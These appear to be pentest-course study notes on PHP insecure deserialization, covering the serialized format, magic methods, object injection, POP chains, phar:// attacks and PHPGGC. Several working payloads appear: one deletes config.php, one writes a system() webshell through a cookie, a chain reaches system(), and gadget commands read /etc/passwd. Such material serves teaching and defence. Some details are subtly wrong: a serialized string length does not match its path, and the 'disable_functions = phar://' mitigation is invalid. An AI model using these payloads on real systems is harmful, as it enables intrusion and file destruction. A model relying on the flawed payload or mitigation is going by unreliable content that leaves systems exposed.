2026-02-06

Status:

Tags: [[eWPTX]] [[Serialization]]
###### Prerequisites: [[What is Serialization?]] [[Insecure Deserialization]]
# PHP Deserialization

## Overview

PHP uses `serialize()` and `unserialize()` to convert objects/data to strings and back. When user-controlled input reaches `unserialize()`, an attacker can inject crafted serialized objects that trigger **magic methods** on reconstruction — leading to file operations, SQL injection, or RCE.

This is called **PHP Object Injection**.

---

## PHP Serialization Format

`serialize()` converts any PHP value into a string representation:

```php
<?php
class User {
    public $name = "Alice";
    public $role = "admin";
}

$user = new User();
echo serialize($user);
// O:4:"User":2:{s:4:"name";s:5:"Alice";s:4:"role";s:5:"admin";}
?>
```

### Type Prefixes

| Prefix | Type | Example |
|--------|------|---------|
| `s` | String | `s:5:"Alice"` |
| `i` | Integer | `i:42` |
| `b` | Boolean | `b:1` (true), `b:0` (false) |
| `d` | Float | `d:3.14` |
| `a` | Array | `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}` |
| `O` | Object | `O:4:"User":2:{...}` |
| `N` | NULL | `N;` |

### Anatomy of a Serialized Object

```
O:4:"User":2:{s:4:"name";s:5:"Alice";s:4:"role";s:5:"admin";}
│ │  │     │   └─────────────── properties ──────────────────┘
│ │  │     └── number of properties (2)
│ │  └──────── class name ("User")
│ └─────────── class name length (4)
└───────────── type indicator (O = Object)
```

Each property is a key-value pair: `s:4:"name";s:5:"Alice";` means property `name` (string, length 4) has value `Alice` (string, length 5).

### Property Visibility in Serialization

```php
class Example {
    public $pub = "a";        // s:3:"pub";s:1:"a";
    protected $prot = "b";    // s:7:"\x00*\x00prot";s:1:"b";
    private $priv = "c";      // s:14:"\x00Example\x00priv";s:1:"c";
}
```

- **Public**: normal name
- **Protected**: `\x00*\x00` prefix
- **Private**: `\x00ClassName\x00` prefix

![[Pics/deserialization/php-serialization-syntax.svg]]

---

## Magic Methods

Magic methods are automatically invoked by PHP at specific points in an object's lifecycle. When `unserialize()` reconstructs an object, certain magic methods fire — this is the attack surface.

### Lifecycle-Triggered Methods

| Method | Trigger |
|--------|---------|
| `__construct()` | Object is created (`new Class()`) — **NOT called by unserialize** |
| `__destruct()` | Object is destroyed (script ends, `unset()`, garbage collection) |
| `__wakeup()` | Called immediately when `unserialize()` reconstructs the object |
| `__sleep()` | Called when `serialize()` is invoked on the object |
| `__toString()` | Object is used as a string (echo, concatenation, comparison) |
| `__call()` | Inaccessible/nonexistent method is called on the object |
| `__get()` | Inaccessible/nonexistent property is read |
| `__set()` | Inaccessible/nonexistent property is written |

### Key Point for Exploitation

`unserialize()` calls `__wakeup()` first. When the object goes out of scope or the script ends, `__destruct()` fires. Both are automatic — the attacker doesn't need to call any methods.

![[Pics/deserialization/php-magic-methods.svg]]

---

## PHP Object Injection

### The Vulnerability

If `unserialize()` processes attacker-controlled input, the attacker controls:
1. **Which class** gets instantiated (the `O:ClassName` part)
2. **What property values** the object has

If any class in the application's scope has dangerous magic methods, the attacker can exploit them.

![[Pics/deserialization/php-object-injection-flow.svg]]

### Example: File Deletion via `__destruct()`

```php
<?php
// Application class
class FileManager {
    public $filename;

    public function __destruct() {
        if (file_exists($this->filename)) {
            unlink($this->filename);  // deletes the file
            echo "Cleaned up: {$this->filename}\n";
        }
    }
}

// Vulnerable endpoint
$data = $_GET['data'];
$obj = unserialize($data);  // attacker controls $data
?>
```

**Exploit payload**:

```php
// Attacker generates:
$payload = new FileManager();
$payload->filename = "/var/www/html/config.php";
echo serialize($payload);
// O:11:"FileManager":1:{s:8:"filename";s:26:"/var/www/html/config.php";}
```

When the script ends, `__destruct()` fires and deletes `config.php`.

```
GET /page.php?data=O:11:"FileManager":1:{s:8:"filename";s:26:"/var/www/html/config.php";}
```

### Example: RCE via `__wakeup()`

```php
<?php
class Logger {
    public $logFile;
    public $logData;

    public function __wakeup() {
        file_put_contents($this->logFile, $this->logData);
    }
}

// Vulnerable
$obj = unserialize($_COOKIE['session']);
?>
```

**Exploit**: write a PHP webshell:

```php
$payload = new Logger();
$payload->logFile = "/var/www/html/shell.php";
$payload->logData = "<?php system(\$_GET['cmd']); ?>";
echo urlencode(serialize($payload));
```

### Example: Code Execution via `__toString()`

```php
<?php
class Template {
    public $content;

    public function __toString() {
        return eval($this->content);  // dangerous
    }
}

// If a deserialized object is used in string context:
echo unserialize($input);  // triggers __toString()
?>
```

---

## POP Chains (Property-Oriented Programming)

When no single class has a directly exploitable magic method, attackers chain multiple classes together. Each class's magic method triggers the next, forming a **POP chain**.

### Chain Example

```php
<?php
class EntryPoint {
    public $next;
    public function __destruct() {
        $this->next->cleanup();  // calls cleanup() on $next
    }
}

class MiddleStep {
    public $callback;
    public function __call($name, $args) {
        // __call fires because cleanup() doesn't exist on this class
        call_user_func($this->callback);
    }
}

class Executor {
    public $cmd;
    public function run() {
        system($this->cmd);
    }
}
?>
```

**Building the chain**:

```php
$exec = new Executor();
$exec->cmd = "id";

$middle = new MiddleStep();
$middle->callback = [$exec, "run"];  // calls Executor::run()

$entry = new EntryPoint();
$entry->next = $middle;  // __destruct() → $middle->cleanup() → __call() → run()

echo serialize($entry);
```

Chain flow: `__destruct()` → `__call()` → `call_user_func()` → `system("id")`

---

## phar:// Deserialization

Even without a direct `unserialize()` call, PHP file operations on `phar://` streams trigger deserialization of the archive's metadata.

### Vulnerable Functions

Any function that accepts a file path and processes it:

```
file_exists()    file_get_contents()    fopen()
is_file()        is_dir()               stat()
copy()           rename()               unlink()
filemtime()      filesize()             file()
```

### Creating a Malicious Phar

```php
<?php
class FileManager {
    public $filename = "/var/www/html/config.php";
}

$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$payload = new FileManager();
$phar->setMetadata($payload);  // serialized object stored in metadata

$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

**Trigger**: if the app does `file_exists($_GET['file'])`, use:

```
GET /check.php?file=phar://uploads/avatar.jpg
```

The Phar archive can be disguised with any extension (`.jpg`, `.png`, etc.) since PHP reads the magic bytes.

---

## PHPGGC

[PHPGGC](https://github.com/ambionics/phpggc) (PHP Generic Gadget Chains) automates POP chain generation for common frameworks.

```bash
# List available gadget chains
phpggc -l

# Generate payload for specific framework
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 system whoami
phpggc Monolog/RCE1 system "cat /etc/passwd"

# Output as base64
phpggc -b Laravel/RCE1 system id

# Generate as Phar archive
phpggc -p phar -o exploit.phar Monolog/RCE1 system id

# Supported frameworks include:
# Laravel, Symfony, Monolog, Guzzle, Doctrine,
# WordPress, Magento, CakePHP, Yii, Slim, ...
```

---

## Detection Indicators

```
# Serialized PHP object in user input (URL, cookie, POST body):
O:[digits]:"[ClassName]":[digits]:{

# Base64-encoded variant:
Tzo0OiJVc2VyIjoyOntz...

# Look for in: cookies, hidden form fields, API parameters, file uploads
```

---

## Mitigation

- **Never** pass user input to `unserialize()` — use `json_decode()` instead
- Use `unserialize()` with `allowed_classes` (PHP 7+):
  ```php
  unserialize($data, ["allowed_classes" => false]);           // no objects
  unserialize($data, ["allowed_classes" => ["User", "Role"]]); // whitelist
  ```
- Disable `phar://` stream wrapper if not needed:
  ```ini
  ; php.ini
  disable_functions = phar://
  ```
- Use HMAC signatures to validate serialized data integrity before deserializing
- Audit magic methods in all application classes for dangerous operations

